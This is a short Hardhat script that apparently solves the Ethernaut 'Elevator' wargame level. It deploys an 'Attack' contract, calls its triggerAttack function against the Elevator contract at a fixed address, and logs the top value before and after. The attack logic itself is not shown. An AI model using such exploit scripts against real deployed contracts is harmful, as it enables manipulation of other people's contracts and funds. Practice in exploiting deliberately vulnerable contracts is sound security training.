import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const elevatorAddress = "0x9aad7180FBF86360f133b2aFbAC2D73d59fBE5f2";

    const Attack = await helper.deployContract("Attack");
    const Elevator = await helper.getContractAt("Elevator", elevatorAddress);

    console.log(await Elevator.top());

    let tx = await Attack.triggerAttack(elevatorAddress);
    await tx.wait();

    console.log(await Elevator.top());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });